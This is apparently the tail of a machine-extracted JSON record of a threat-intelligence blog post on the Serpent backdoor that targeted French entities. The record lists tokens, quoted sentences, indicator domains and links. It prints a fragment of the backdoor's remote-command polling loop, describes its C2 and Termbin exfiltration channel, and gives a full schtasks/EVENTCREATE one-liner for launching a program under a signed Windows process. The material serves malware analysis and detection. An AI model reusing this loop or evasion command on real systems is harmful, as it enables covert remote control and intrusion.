time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x2ffc296e>",
                    "type": "UnknownWord",
                    "value": "<random"
                },
                "references": {
                    "sentences": [
                        "This Serpent backdoor periodically pings the order server (the first onion[.]pet URL) and expects responses of the form <random integer>--<hostname>--<command>. If <hostname> matches the hostname of the infected computer, the infected host runs the command provided by the order server (<command>), which could be any Windows command as designated by the attacker, and records the output. The malware then uses PySocks to connect to the command line pastebin tool Termbin, pastes the output to a bin, and receives the bins unique URL. Finally, the malware sends a request to the answer server (the second onion[.]pet URL), including the hostname and bin URL in the header. This allows the attacker to monitor the bin outputs via the answer URL and see what the infected hosts response was. The malware cycles through this process indefinitely."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<DOMAIN_0x6a05e9c2>",
                            "type": "Domain",
                            "value": "onion.pet"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x2ffc296e>",
                            "type": "UnknownWord",
                            "value": "<random"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xe5b88b00>",
                    "type": "UnknownWord",
                    "value": "integer>--<hostname>--<command>"
                },
                "references": {
                    "sentences": [
                        "This Serpent backdoor periodically pings the order server (the first onion[.]pet URL) and expects responses of the form <random integer>--<hostname>--<command>. If <hostname> matches the hostname of the infected computer, the infected host runs the command provided by the order server (<command>), which could be any Windows command as designated by the attacker, and records the output. The malware then uses PySocks to connect to the command line pastebin tool Termbin, pastes the output to a bin, and receives the bins unique URL. Finally, the malware sends a request to the answer server (the second onion[.]pet URL), including the hostname and bin URL in the header. This allows the attacker to monitor the bin outputs via the answer URL and see what the infected hosts response was. The malware cycles through this process indefinitely."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<DOMAIN_0x6a05e9c2>",
                            "type": "Domain",
                            "value": "onion.pet"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xe5b88b00>",
                            "type": "UnknownWord",
                            "value": "integer>--<hostname>--<command>"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x89c73e13>",
                    "type": "UnknownWord",
                    "value": "<hostname>"
                },
                "references": {
                    "sentences": [
                        "This Serpent backdoor periodically pings the order server (the first onion[.]pet URL) and expects responses of the form <random integer>--<hostname>--<command>. If <hostname> matches the hostname of the infected computer, the infected host runs the command provided by the order server (<command>), which could be any Windows command as designated by the attacker, and records the output. The malware then uses PySocks to connect to the command line pastebin tool Termbin, pastes the output to a bin, and receives the bins unique URL. Finally, the malware sends a request to the answer server (the second onion[.]pet URL), including the hostname and bin URL in the header. This allows the attacker to monitor the bin outputs via the answer URL and see what the infected hosts response was. The malware cycles through this process indefinitely."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xf1d9fb7d>",
                    "type": "UnknownWord",
                    "value": "<command>"
                },
                "references": {
                    "sentences": [
                        "This Serpent backdoor periodically pings the order server (the first onion[.]pet URL) and expects responses of the form <random integer>--<hostname>--<command>. If <hostname> matches the hostname of the infected computer, the infected host runs the command provided by the order server (<command>), which could be any Windows command as designated by the attacker, and records the output. The malware then uses PySocks to connect to the command line pastebin tool Termbin, pastes the output to a bin, and receives the bins unique URL. Finally, the malware sends a request to the answer server (the second onion[.]pet URL), including the hostname and bin URL in the header. This allows the attacker to monitor the bin outputs via the answer URL and see what the infected hosts response was. The malware cycles through this process indefinitely."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xeaa0064c>",
                    "type": "UnknownWord",
                    "value": "termbin"
                },
                "references": {
                    "sentences": [
                        "This Serpent backdoor periodically pings the order server (the first onion[.]pet URL) and expects responses of the form <random integer>--<hostname>--<command>. If <hostname> matches the hostname of the infected computer, the infected host runs the command provided by the order server (<command>), which could be any Windows command as designated by the attacker, and records the output. The malware then uses PySocks to connect to the command line pastebin tool Termbin, pastes the output to a bin, and receives the bins unique URL. Finally, the malware sends a request to the answer server (the second onion[.]pet URL), including the hostname and bin URL in the header. This allows the attacker to monitor the bin outputs via the answer URL and see what the infected hosts response was. The malware cycles through this process indefinitely."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x7ba9c70d>",
                    "type": "UnknownWord",
                    "value": "bin"
                },
                "references": {
                    "sentences": [
                        "This Serpent backdoor periodically pings the order server (the first onion[.]pet URL) and expects responses of the form <random integer>--<hostname>--<command>. If <hostname> matches the hostname of the infected computer, the infected host runs the command provided by the order server (<command>), which could be any Windows command as designated by the attacker, and records the output. The malware then uses PySocks to connect to the command line pastebin tool Termbin, pastes the output to a bin, and receives the bins unique URL. Finally, the malware sends a request to the answer server (the second onion[.]pet URL), including the hostname and bin URL in the header. This allows the attacker to monitor the bin outputs via the answer URL and see what the infected hosts response was. The malware cycles through this process indefinitely."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<DOMAIN_0x6a05e9c2>",
                            "type": "Domain",
                            "value": "onion.pet"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x7ba9c70d>",
                            "type": "UnknownWord",
                            "value": "bin"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xd2de4a14>",
                    "type": "UnknownWord",
                    "value": "jamaican"
                },
                "references": {
                    "sentences": [
                        "Both steganographic images are hosted on what appears to be a Jamaican credit union website."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xce3bcb9c>",
                    "type": "UnknownWord",
                    "value": "onevent"
                },
                "references": {
                    "sentences": [
                        "schtasks.exe /CREATE /SC ONEVENT /EC application /mo *[System/EventID=777] /f /TN run /TR \"calc.exe\" & EVENTCREATE /ID 777 /L APPLICATION /T INFORMATION /SO DummyEvent /D \"Initiatescheduled task.\" & schtasks.exe /DELETE /TN run /f"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xccdc0023>",
                            "type": "File",
                            "value": "schtasks.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xce3bcb9c>",
                            "type": "UnknownWord",
                            "value": "onevent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xd8787191>",
                            "type": "File",
                            "value": "calc.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xce3bcb9c>",
                            "type": "UnknownWord",
                            "value": "onevent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xa78922a6>",
                    "type": "UnknownWord",
                    "value": "eventid"
                },
                "references": {
                    "sentences": [
                        "The above command leverages schtasks.exe to create a one-time task to call a portable executable. In this case the executable is called calc.exe. The trigger for this task is contingent on the creation of a Windows event with EventID of 777. The command then creates a dummy event to trigger the task and deletes the task from the task scheduler. This peculiar application of tasking logic results in the portable executable being executed as a child process of taskhostsw.exe which is a signed Windows binary.",
                        "schtasks.exe /CREATE /SC ONEVENT /EC application /mo *[System/EventID=777] /f /TN run /TR \"calc.exe\" & EVENTCREATE /ID 777 /L APPLICATION /T INFORMATION /SO DummyEvent /D \"Initiatescheduled task.\" & schtasks.exe /DELETE /TN run /f"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xccdc0023>",
                            "type": "File",
                            "value": "schtasks.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xa78922a6>",
                            "type": "UnknownWord",
                            "value": "eventid"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xd8787191>",
                            "type": "File",
                            "value": "calc.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xa78922a6>",
                            "type": "UnknownWord",
                            "value": "eventid"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x8e11806c>",
                    "type": "UnknownWord",
                    "value": "eventcreate"
                },
                "references": {
                    "sentences": [
                        "schtasks.exe /CREATE /SC ONEVENT /EC application /mo *[System/EventID=777] /f /TN run /TR \"calc.exe\" & EVENTCREATE /ID 777 /L APPLICATION /T INFORMATION /SO DummyEvent /D \"Initiatescheduled task.\" & schtasks.exe /DELETE /TN run /f"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xccdc0023>",
                            "type": "File",
                            "value": "schtasks.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x8e11806c>",
                            "type": "UnknownWord",
                            "value": "eventcreate"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xd8787191>",
                            "type": "File",
                            "value": "calc.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x8e11806c>",
                            "type": "UnknownWord",
                            "value": "eventcreate"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xa60d5bc1>",
                    "type": "UnknownWord",
                    "value": "dummyevent"
                },
                "references": {
                    "sentences": [
                        "schtasks.exe /CREATE /SC ONEVENT /EC application /mo *[System/EventID=777] /f /TN run /TR \"calc.exe\" & EVENTCREATE /ID 777 /L APPLICATION /T INFORMATION /SO DummyEvent /D \"Initiatescheduled task.\" & schtasks.exe /DELETE /TN run /f"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xd8787191>",
                            "type": "File",
                            "value": "calc.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xa60d5bc1>",
                            "type": "UnknownWord",
                            "value": "dummyevent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xccdc0023>",
                            "type": "File",
                            "value": "schtasks.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xa60d5bc1>",
                            "type": "UnknownWord",
                            "value": "dummyevent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xbfcc18db>",
                    "type": "UnknownWord",
                    "value": "initiatescheduled"
                },
                "references": {
                    "sentences": [
                        "schtasks.exe /CREATE /SC ONEVENT /EC application /mo *[System/EventID=777] /f /TN run /TR \"calc.exe\" & EVENTCREATE /ID 777 /L APPLICATION /T INFORMATION /SO DummyEvent /D \"Initiatescheduled task.\" & schtasks.exe /DELETE /TN run /f"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xccdc0023>",
                            "type": "File",
                            "value": "schtasks.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xbfcc18db>",
                            "type": "UnknownWord",
                            "value": "initiatescheduled"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xd8787191>",
                            "type": "File",
                            "value": "calc.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xbfcc18db>",
                            "type": "UnknownWord",
                            "value": "initiatescheduled"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xafc19c12>",
                    "type": "UnknownWord",
                    "value": "one-time"
                },
                "references": {
                    "sentences": [
                        "The above command leverages schtasks.exe to create a one-time task to call a portable executable. In this case the executable is called calc.exe. The trigger for this task is contingent on the creation of a Windows event with EventID of 777. The command then creates a dummy event to trigger the task and deletes the task from the task scheduler. This peculiar application of tasking logic results in the portable executable being executed as a child process of taskhostsw.exe which is a signed Windows binary."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xccdc0023>",
                            "type": "File",
                            "value": "schtasks.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xafc19c12>",
                            "type": "UnknownWord",
                            "value": "one-time"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xd7bdc8a7>",
                    "type": "UnknownWord",
                    "value": "vast"
                },
                "references": {
                    "sentences": [
                        "Proofpoint has a vast amount of organic threat data to pour over every day. This presents unique challenges when trying to surface interesting threats. The aforementioned campaign and the threats contained within were surfaced using Proofpoints machine learning-enabled Campaign Discovery tool. This tool uses a custom-built deep neural network model to generate useful numeric encodings of threats based on their behavioral forensics. These encodings are then used to generate clusters of similar threats. This allows Proofpoints threat researchers to identify campaigns, including the shared infrastructure, TTPs, and indicators of compromise that define them more easily. By clustering together threats that are alike, the tool also facilitates the discovery of anomalous or unusual threats that are not similar to any other observed threats. We lovingly refer to this tool as Camp Disco and it sports themed ascii art like all sweet tools should."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x5d58451d>",
                    "type": "UnknownWord",
                    "value": "pour"
                },
                "references": {
                    "sentences": [
                        "Proofpoint has a vast amount of organic threat data to pour over every day. This presents unique challenges when trying to surface interesting threats. The aforementioned campaign and the threats contained within were surfaced using Proofpoints machine learning-enabled Campaign Discovery tool. This tool uses a custom-built deep neural network model to generate useful numeric encodings of threats based on their behavioral forensics. These encodings are then used to generate clusters of similar threats. This allows Proofpoints threat researchers to identify campaigns, including the shared infrastructure, TTPs, and indicators of compromise that define them more easily. By clustering together threats that are alike, the tool also facilitates the discovery of anomalous or unusual threats that are not similar to any other observed threats. We lovingly refer to this tool as Camp Disco and it sports themed ascii art like all sweet tools should."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x34a29e56>",
                    "type": "UnknownWord",
                    "value": "learning-enabled"
                },
                "references": {
                    "sentences": [
                        "Proofpoint has a vast amount of organic threat data to pour over every day. This presents unique challenges when trying to surface interesting threats. The aforementioned campaign and the threats contained within were surfaced using Proofpoints machine learning-enabled Campaign Discovery tool. This tool uses a custom-built deep neural network model to generate useful numeric encodings of threats based on their behavioral forensics. These encodings are then used to generate clusters of similar threats. This allows Proofpoints threat researchers to identify campaigns, including the shared infrastructure, TTPs, and indicators of compromise that define them more easily. By clustering together threats that are alike, the tool also facilitates the discovery of anomalous or unusual threats that are not similar to any other observed threats. We lovingly refer to this tool as Camp Disco and it sports themed ascii art like all sweet tools should."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xd1b0853a>",
                    "type": "UnknownWord",
                    "value": "custom-built"
                },
                "references": {
                    "sentences": [
                        "Proofpoint has a vast amount of organic threat data to pour over every day. This presents unique challenges when trying to surface interesting threats. The aforementioned campaign and the threats contained within were surfaced using Proofpoints machine learning-enabled Campaign Discovery tool. This tool uses a custom-built deep neural network model to generate useful numeric encodings of threats based on their behavioral forensics. These encodings are then used to generate clusters of similar threats. This allows Proofpoints threat researchers to identify campaigns, including the shared infrastructure, TTPs, and indicators of compromise that define them more easily. By clustering together threats that are alike, the tool also facilitates the discovery of anomalous or unusual threats that are not similar to any other observed threats. We lovingly refer to this tool as Camp Disco and it sports themed ascii art like all sweet tools should."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xa44c5046>",
                    "type": "UnknownWord",
                    "value": "ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid"
                },
                "references": {
                    "sentences": [],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x71d07a7b>",
                    "type": "UnknownWord",
                    "value": "mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd"
                },
                "references": {
                    "sentences": [],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x6dd302d7>",
                    "type": "UnknownWord",
                    "value": "shorturl"
                },
                "references": {
                    "sentences": [],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<URL_0xdc412f5b>",
                            "type": "Url",
                            "value": "http://shorturl.at/qzes8"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x6dd302d7>",
                            "type": "UnknownWord",
                            "value": "shorturl"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xd5bbbe09>",
                    "type": "UnknownWord",
                    "value": "allarchiving"
                },
                "references": {
                    "sentences": [
                        "*Business Email:Select*Blog Interest:AllArchiving and ComplianceCISO PerspectivesCloud SecurityCorporate NewsEmail and Cloud ThreatsInformation ProtectionInsider Threat ManagementRemote Workforce ProtectionSecurity Awareness TrainingSecurity BriefsThreat Insight"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x36e0c7d0>",
                    "type": "UnknownWord",
                    "value": "complianceciso"
                },
                "references": {
                    "sentences": [
                        "*Business Email:Select*Blog Interest:AllArchiving and ComplianceCISO PerspectivesCloud SecurityCorporate NewsEmail and Cloud ThreatsInformation ProtectionInsider Threat ManagementRemote Workforce ProtectionSecurity Awareness TrainingSecurity BriefsThreat Insight"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xeb09607c>",
                    "type": "UnknownWord",
                    "value": "perspectivescloud"
                },
                "references": {
                    "sentences": [
                        "*Business Email:Select*Blog Interest:AllArchiving and ComplianceCISO PerspectivesCloud SecurityCorporate NewsEmail and Cloud ThreatsInformation ProtectionInsider Threat ManagementRemote Workforce ProtectionSecurity Awareness TrainingSecurity BriefsThreat Insight"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x29a76757>",
                    "type": "UnknownWord",
                    "value": "protectioninsider"
                },
                "references": {
                    "sentences": [
                        "*Business Email:Select*Blog Interest:AllArchiving and ComplianceCISO PerspectivesCloud SecurityCorporate NewsEmail and Cloud ThreatsInformation ProtectionInsider Threat ManagementRemote Workforce ProtectionSecurity Awareness TrainingSecurity BriefsThreat Insight"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x86c0c16c>",
                    "type": "UnknownWord",
                    "value": "managementremote"
                },
                "references": {
                    "sentences": [
                        "*Business Email:Select*Blog Interest:AllArchiving and ComplianceCISO PerspectivesCloud SecurityCorporate NewsEmail and Cloud ThreatsInformation ProtectionInsider Threat ManagementRemote Workforce ProtectionSecurity Awareness TrainingSecurity BriefsThreat Insight"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x8a68eca4>",
                    "type": "UnknownWord",
                    "value": "protectionsecurity"
                },
                "references": {
                    "sentences": [
                        "*Business Email:Select*Blog Interest:AllArchiving and ComplianceCISO PerspectivesCloud SecurityCorporate NewsEmail and Cloud ThreatsInformation ProtectionInsider Threat ManagementRemote Workforce ProtectionSecurity Awareness TrainingSecurity BriefsThreat Insight"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x89300787>",
                    "type": "UnknownWord",
                    "value": "trainingsecurity"
                },
                "references": {
                    "sentences": [
                        "*Business Email:Select*Blog Interest:AllArchiving and ComplianceCISO PerspectivesCloud SecurityCorporate NewsEmail and Cloud ThreatsInformation ProtectionInsider Threat ManagementRemote Workforce ProtectionSecurity Awareness TrainingSecurity BriefsThreat Insight"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x86571b39>",
                    "type": "UnknownWord",
                    "value": "briefsthreat"
                },
                "references": {
                    "sentences": [
                        "*Business Email:Select*Blog Interest:AllArchiving and ComplianceCISO PerspectivesCloud SecurityCorporate NewsEmail and Cloud ThreatsInformation ProtectionInsider Threat ManagementRemote Workforce ProtectionSecurity Awareness TrainingSecurity BriefsThreat Insight"
                    ],
                    "titles": []
                }
            }
        ]
    },
    "other_links": [],
    "info": {
        "potential_threats": {},
        "sigma": false,
        "yara": false
    },
    "keywords": {
        "classified": [],
        "dubbed": [],
        "associated": [
            "Proofpoint detects and blocks all documents associated with the campaigns and has published the following Emerging Threat signatures:"
        ],
        "targets": [
            "serpent, no swiping! new backdoor targets french entities with unique attack chain",
            "serpent, no swiping! new backdoor targets french entities with unique attack chain",
            "Serpent, No Swiping! New Backdoor Targets French Entities with Unique Attack Chain"
        ],
        "attributed": []
    },
    "resources": {
        "links": {
            "github": [],
            "pastebin": [],
            "other": [
                "https://www.proofpoint.com/us",
                "https://www.proofpoint.com/us/blog",
                "https://www.proofpoint.com/us/blog/threat-insight",
                "https://chocolatey.org/install.ps1",
                "https://pypi.org/project/pip/",
                "https://pypi.org/project/PySocks/",
                "https://www.proofpoint.com/us/threat-insight/post/seems-phishy-back-school-lures-target-university-students-and-staff",
                "https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505"
            ]
        },
        "images": [
            "https://www.proofpoint.com/themes/custom/proofpoint/dist/app-drupal/assets/home.svg",
            "https://www.proofpoint.com/sites/default/files/styles/image_768_300/public/blog-banners/pfpt-blog-france.jpg?itok=qTmxBxBi",
            "https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-03-18%20at%208.24.36%20AM_0.png",
            "https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-03-18%20at%208.21.56%20AM_0.png",
            "https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-03-18%20at%208.22.22%20AM_0.png",
            "https://www.proofpoint.com/sites/default/files/inline-images/Figure%203_2.png",
            "https://www.proofpoint.com/sites/default/files/inline-images/Figure%204_2.png",
            "https://www.proofpoint.com/sites/default/files/inline-images/Screen%20Shot%202022-03-18%20at%208.24.02%20AM_0.png"
        ]
    }
}